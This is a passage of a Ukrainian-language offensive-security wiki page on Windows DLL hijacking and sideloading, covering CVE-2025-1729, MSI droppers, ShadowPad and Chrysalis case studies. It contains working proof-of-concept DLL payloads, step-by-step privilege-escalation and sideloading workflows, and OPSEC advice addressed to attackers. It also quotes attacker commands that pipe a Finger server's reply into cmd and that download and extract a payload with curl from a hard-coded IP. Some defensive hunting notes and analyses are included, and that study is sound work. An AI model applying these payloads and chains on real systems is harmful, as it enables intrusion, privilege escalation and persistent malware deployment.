- Ви можете клонувати запис в реєстрі вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його так, щоб він вказував на довільний binary/DLL, імпортувати його, а потім встановити `configuration` у назву цього AT. Це забезпечує proxy для довільного виконання в межах Accessibility framework.

Примітки
- Запис у `%windir%\System32` і зміна значень HKLM потребують прав адміністратора.
- Усю логіку payload можна розмістити в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Приклад: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей приклад демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), що відстежується як **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом користувача, який увійшов у систему.
- **Права доступу до директорії**: Доступна для запису `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **Поведінка пошуку DLL**: Спочатку намагається завантажити `hostfxr.dll` із робочої директорії та записує "NAME NOT FOUND", якщо файл відсутній, що вказує на пріоритет пошуку в локальній директорії.

### Реалізація Exploit

Зловмисник може розмістити шкідливий stub `hostfxr.dll` у цій самій директорії, використовуючи відсутню DLL для досягнення code execution у контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Потік атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску scheduled task о 9:30 під контекстом поточного користувача.
3. Якщо під час виконання task увійшов адміністратор, malicious DLL запускається в сесії адміністратора з medium integrity.
4. Поєднайте стандартні техніки обходу UAC, щоб підвищити привілеї з medium integrity до SYSTEM.

## Практичний приклад: MSI CustomAction Dropper + DLL Side-Loading через Signed Host (wsc_proxy.exe)

Threat actors часто поєднують MSI-based droppers із DLL side-loading, щоб виконувати payload під trusted, signed process.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. CustomAction непомітно запускається під час GUI install (наприклад, LaunchApplication або VBScript action), відновлюючи наступний stage з embedded resources.
- Dropper записує legitimate, signed EXE і malicious DLL в одну директорію (приклад пари: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Коли signed EXE запускається, Windows DLL search order спочатку завантажує wsc.dll з working directory, виконуючи code атакувальника під signed parent (ATT&CK T1574.001).

Аналіз MSI (на що звертати увагу)
- CustomAction table:
- Шукайте entries, які запускають executables або VBScript. Приклад підозрілої pattern: LaunchApplication, що виконує embedded file у background.
- В Orca (Microsoft Orca.exe) перевірте CustomAction, InstallExecuteSequence і Binary tables.
- Embedded/split payloads у MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Або використайте lessmsi: lessmsi x package.msi C:\out
- Шукайте multiple small fragments, які concatenated і decrypted VBScript CustomAction. Типовий flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичний sideloading із wsc_proxy.exe
- Помістіть ці два файли в одну папку:
- wsc_proxy.exe: легітимний підписаний host (Avast). Процес намагається завантажити wsc.dll за іменем із власного каталогу.
- wsc.dll: DLL атакувальника. Якщо не потрібні певні exports, достатньо DllMain; в іншому разі створіть proxy DLL і перенаправте необхідні exports до справжньої бібліотеки, виконуючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог експорту використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на визначення імені DLL host binary. Якщо host використовує абсолютні шляхи або безпечні прапорці завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет і мають враховуватися під час вибору host binary та набору exports.

## Підписані triads + зашифровані payloads (case study ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **triad із трьох файлів**, маскуючись під легітимне ПЗ і водночас зберігаючи основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Підписаний host EXE** – зловживають файлами таких vendors, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers перейменовують executable так, щоб він був схожий на Windows binary (наприклад, `conhost.exe`), але Authenticode signature залишається дійсним.
2. **Malicious loader DLL** – розміщується поруч з EXE під очікуваним іменем (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC binary, обфускованим за допомогою ScatterBrain framework; його єдине завдання – знайти encrypted blob, розшифрувати його та reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` у тому самому каталозі. Після memory-mapping розшифрованого payload loader видаляє TMP file, щоб знищити forensic evidence.

Нотатки щодо tradecraft:

* Перейменування signed EXE (із збереженням оригінального `OriginalFileName` у PE header) дає змогу маскувати його під Windows binary, водночас зберігаючи vendor signature, тому відтворюйте звичку Ink Dragon розміщувати binaries, схожі на `conhost.exe`, які насправді є AMD/NVIDIA utilities.
* Оскільки executable залишається trusted, більшості allowlisting controls достатньо, щоб ваша malicious DLL знаходилася поруч із ним. Зосередьтеся на налаштуванні loader DLL; signed parent зазвичай може запускатися без змін.
* ShadowPad decryptor очікує, що TMP blob знаходиться поруч із loader і доступний для запису, щоб після mapping він міг занулити file. Зберігайте каталог доступним для запису до завантаження payload; після розміщення в пам’яті TMP file можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators поєднують DLL sideloading із LOLBAS, тому єдиним custom artifact на диску залишається malicious DLL поруч із trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell запускає `cmd.exe /c`, отримує commands із Finger server і передає їх до `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує TCP/79 text; `| cmd` виконує відповідь server, що дає змогу operators змінювати second stage server-side.

- **Built-in download/extract:** Завантажте archive з benign extension, розпакуйте його та розмістіть sideload target разом із DLL у випадковому `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує progress і переходить за redirects; `tar -xf` використовує вбудований у Windows tar.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб telemetry показувала процес, створений CIM, під час завантаження colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з binaries, які віддають перевагу local DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) працює під trusted name.

- **Hunting:** Створюйте alert на `forfiles`, коли `/p`, `/m` і `/c` з’являються разом; поза admin scripts це трапляється рідко.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Нещодавня intrusion Lotus Blossom зловживала trusted update chain для доставки NSIS-packed dropper, який розміщував DLL sideload і повністю in-memory payloads.<sup>[[13]](#references)</sup>

Перебіг tradecraft
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, розміщує перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` і encrypted blob `BluetoothService`, а потім запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob через mmap; `LogWrite` розшифровує його за допомогою custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material, похідного від попереднього hash), перезаписує buffer plaintext shellcode, звільняє temps і переходить до нього.
- Щоб уникнути IAT, loader визначає APIs шляхом hashing export names із використанням FNV-1a basis 0x811C9DC5 + prime 0x100019, потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює результат із salted target hashes.

Основний shellcode (Chrysalis)
- Розшифровує PE-like main module шляхом повторення add/XOR/sub із key `gQ2JR&9;` упродовж п’яти проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress`, щоб завершити import resolution.
- Відновлює DLL name strings під час runtime за допомогою per-character bit-rotate/XOR transforms, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить **PEB → InMemoryOrderModuleList**, розбирає кожну export table блоками по 4 bytes із Murmur-style mixing і переходить до `GetProcAddress`, лише якщо hash не знайдено.

Embedded configuration & C2
- Config зберігається всередині dropped `BluetoothService` file за **offset 0x30808** (size **0x980**) і розшифровується за допомогою RC4 із key `qwhvb^435h&*7`, відкриваючи C2 URL та User-Agent.
- Beacons створюють dot-delimited host profile, додають на початок tag `4Q`, а потім RC4-encrypt із key `vAuig34%^325hGV` перед `HttpSendRequestA` через HTTPS. Responses розшифровуються RC4 і передаються через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode визначається CLI args: без args = install persistence (service/Run key), що вказує на `-i`; `-i` повторно запускає self із `-k`; `-k` пропускає install і запускає payload.

Альтернативний loader
- Під час тієї самої intrusion було розміщено Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` із `C:\ProgramData\USOShared\`, а поруч знаходився `libtcc.dll`. Наданий attacker C source містив shellcode, який компілювався та запускався in-memory без запису PE на диск. Відтворіть за допомогою:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей заснований на TCC етап компіляції та запуску імпортував `Wininet.dll` під час виконання та завантажував shellcode другого етапу з жорстко закодованої URL-адреси, забезпечуючи гнучкий loader, який маскується під запуск компілятора.

## Sideloading підписаного host із proxying export-функцій + паркуванням потоку host

Деякі ланцюжки DLL sideloading додають **інженерію стабільності**, щоб легітимний host залишався активним достатньо довго для коректного завантаження наступних етапів, замість аварійного завершення після завантаження malicious DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістити довірений EXE поруч із malicious DLL, використовуючи очікуване ім’я залежності, наприклад `version.dll`.
- Malicious DLL **проксіює кожен очікуваний export** до справжньої системної DLL (наприклад `%SystemRoot%\\System32\\version.dll`), щоб resolution імпортів продовжував працювати, а host process залишався функціональним.
- Після завантаження malicious DLL **патчить entry point host**, щоб main thread переходив у нескінченний цикл `Sleep`, а не завершувався або не виконував code paths, які завершили б process.
- Новий thread виконує справжню malicious роботу: розшифровує ім’я або шлях DLL наступного етапу (RC4/XOR є поширеними), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне DLL proxying зберігає сумісність API, але не гарантує, що host залишатиметься активним достатньо довго для наступних етапів.
- Паркування main thread у `Sleep(INFINITE)` — простий спосіб утримувати підписаний process у пам’яті, поки loader виконує розшифрування, staging або network bootstrap у worker thread.
- Полювання лише на підозрілий `DllMain` може пропустити цей шаблон, якщо цікава поведінка відбувається після патчу entry point host і запуску secondary thread.

Мінімальний workflow
1. Скопіювати підписаний host EXE і визначити DLL, яку він завантажує з локальної директорії.
2. Створити proxy DLL, яка експортує ті самі функції та перенаправляє їх до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити worker thread.
4. Із цього thread пропатчити entry point host або start routine main thread так, щоб він зациклювався на `Sleep`.
5. Розшифрувати ім’я/config DLL наступного етапу та викликати `LoadLibrary` або виконати manual-map payload.

Захисні pivots
- Підписані процеси, які завантажують `version.dll` або подібні поширені бібліотеки з власної директорії застосунку, а не з `System32`.
- Memory patches у process entry point невдовзі після завантаження image, особливо jumps/calls, перенаправлені до `Sleep`/`SleepEx`.
- Threads, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Повноекспортні proxy DLL, розміщені поруч із vendor executables у доступних для запису staging directories, таких як `ProgramData`, `%TEMP%` або шляхи розпакованих архівів.

## References

- [1] [Red Canary – Розвідувальні висновки: січень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna — TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове malware, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL Hijacks зустрічаються з Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC — api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — Цифрові двійники: анатомія кампаній еволюційного impersonation, що розповсюджують Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — Конвергенція інтересів: аналіз threat clusters, націлених на уряд держави Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — Всередині Ink Dragon: розкриття relay network та внутрішньої роботи stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — Backdoor Chrysalis: поглиблений аналіз toolkit Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — Відстеження espionage campaigns іранської APT Screening Serpens у 2026 році](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — Fast and Furious: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — дії Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
